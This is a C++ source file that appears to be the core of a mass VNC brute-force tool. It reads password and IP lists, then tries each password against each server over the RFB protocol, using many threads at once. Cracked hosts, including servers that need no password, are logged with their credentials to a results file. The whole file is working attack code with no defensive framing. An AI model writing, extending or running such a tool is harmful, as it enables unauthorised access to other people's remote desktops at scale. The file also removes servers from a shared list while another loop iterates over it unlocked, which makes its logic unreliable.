#include "brute_engine.h"
#include "files.h"
#include "net_tools.h"
#include <fstream>
#include <sstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <algorithm>

extern std::atomic<bool> g_running;

BruteEngine::BruteEngine() : running(false) {
}

BruteEngine::~BruteEngine() {
    stop();
    if (results_file.is_open()) {
        results_file.close();
    }
}

bool BruteEngine::init(int max_threads, double timeout) {
    brute_timeout = timeout;
    
    thread_pool = std::make_unique<ThreadPool>(max_threads);
    
    results_file.open("output/results.txt", std::ios::app);
    if (!results_file.is_open()) {
        return false;
    }
    
    FilesHandler files;
    if (!loadPasswords(files.getPasswordsPath())) {
        return false;
    }
    
    if (!loadServers(files.getIPsPath())) {
        return false;
    }
    
    current = 0;
    found = 0;
    running = true;
    
    return true;
}

void BruteEngine::start() {
    if (!running || passwords.empty() || servers.empty()) {
        return;
    }
    
    // Start output thread
    std::thread output(&BruteEngine::outputThread, this);
    output.detach();
    
    // Try each password on each server
    for (const auto& password : passwords) {
        if (!running || !g_running) break;
        
        for (const auto& server : servers) {
            if (!running || !g_running) break;
            
            thread_pool->enqueue([this, server, password]() {
                bruteWorker(server, password);
            });
            
            current++;
        }
    }
    
    // Wait for all tasks to complete
    thread_pool->waitAll();
    running = false;
}

void BruteEngine::stop() {
    running = false;
}

bool BruteEngine::loadPasswords(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return false;
    }
    
    std::string line;
    while (std::getline(file, line)) {
        // Trim whitespace
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (!line.empty()) {
            passwords.push_back(line);
        }
    }
    
    file.close();
    return !passwords.empty();
}

bool BruteEngine::loadServers(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return false;
    }
    
    std::string line;
    while (std::getline(file, line)) {
        // Trim whitespace
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        
        if (line.empty()) continue;
        
        Server server;
        
        // Check for IPv6 format [ip]:port
        if (line[0] == '[') {
            size_t end_bracket = line.find(']');
            if (end_bracket != std::string::npos && line[end_bracket + 1] == ':') {
                server.ip = line.substr(1, end_bracket - 1);
                server.port = std::stoi(line.substr(end_bracket + 2));
                servers.push_back(server);
                continue;
            }
        }
        
        // IPv4 format ip:port
        size_t colon_pos = line.find(':');
        if (colon_pos != std::string::npos) {
            server.ip = line.substr(0, colon_pos);
            server.port = std::stoi(line.substr(colon_pos + 1));
            
            if (NetTools::isIP(server.ip)) {
                servers.push_back(server);
            }
        } else {
            // Just IP, use default port
            if (NetTools::isIP(line)) {
                server.ip = line;
                server.port = 5900; // Default VNC port
                servers.push_back(server);
            }
        }
    }
    
    file.close();
    return !servers.empty();
}

void BruteEngine::bruteWorker(const Server& server, const std::string& password) {
    RFBProtocol rfb(server.ip, password, server.port, brute_timeout);
    
    if (rfb.connect()) {
        RFBResult result = rfb.getResult();
        
        if (result.connected) {
            writeResult(server, password, result);
            found++;
            
            // Remove server from list (optional optimization)
            std::lock_guard<std::mutex> lock(file_mutex);
            servers.erase(
                std::remove_if(servers.begin(), servers.end(),
                    [&server](const Server& s) {
                        return s.ip == server.ip && s.port == server.port;
                    }),
                servers.end()
            );
        }
    }
    
    rfb.close();
}

void BruteEngine::writeResult(const Server& server, const std::string& password, 
                              const RFBResult& result) {
    std::lock_guard<std::mutex> lock(file_mutex);
    
    bool is_ipv6 = NetTools::getIPVersion(server.ip) == 6;
    std::string pwd = result.null_auth ? "null" : password;
    
    if (is_ipv6) {
        results_file << "[" << server.ip << "]:" << server.port 
                     << "-" << pwd << "-[" << result.server_name << "]\n";
    } else {
        results_file << server.ip << ":" << server.port 
                     << "-" << pwd << "-[" << result.server_name << "]\n";
    }
    results_file.flush();
    
    std::cout << "\r[*] " << server.ip << ":" << server.port 
              << " - " << pwd << "              \n\n" << std::flush;
}

void BruteEngine::outputThread() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
        
        std::lock_guard<std::mutex> lock(file_mutex);
        size_t server_count = servers.size();
        
        std::cout << "\r Trying passwords on " << server_count << " servers    " << std::flush;
    }
    std::cout << "\n";
}

